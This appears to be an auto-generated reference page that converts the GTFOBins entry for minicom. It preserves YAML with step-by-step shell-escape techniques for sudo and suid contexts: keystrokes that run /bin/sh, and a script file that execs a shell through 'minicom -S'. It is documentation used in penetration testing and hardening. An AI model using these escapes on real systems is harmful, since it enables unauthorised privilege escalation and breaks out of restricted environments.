---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# minicom

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `minicom` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/minicom` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [minicom](../../tools/linux/minicom.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | minicom |
| name | minicom |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/minicom/ |

## Preserved Source Material

```yaml
_body: ''
_name: minicom
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/minicom
comment: Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.
functions:
  shell:
  - code: minicom -D /dev/null
    comment: 'Start the following command to open the TUI interface, then:


      1. press `Ctrl-A o` and select `Filenames and paths`;

      2. press `e`, type `/bin/sh`, then `Enter`;

      3. Press `Esc` twice;

      4. Press `Ctrl-A k` to drop the shell.


      After the shell, exit with `Ctrl-A x`.'
    contexts:
      sudo: null
      suid:
        comment: 'Start the following command to open the TUI interface, then:


          1. press `Ctrl-A o` and select `Filenames and paths`;

          2. press `e`, type `/bin/sh -p`, then `Enter`;

          3. Press `Esc` twice;

          4. Press `Ctrl-A k` to drop the shell.


          After the shell, exit with `Ctrl-A x`.'
      unprivileged: null
  - code: 'echo ''! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty'' >/path/to/temp-file

      minicom -D /dev/null -S /path/to/temp-file

      reset^J'
    comment: After the shell, exit with `Ctrl-A x`.
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
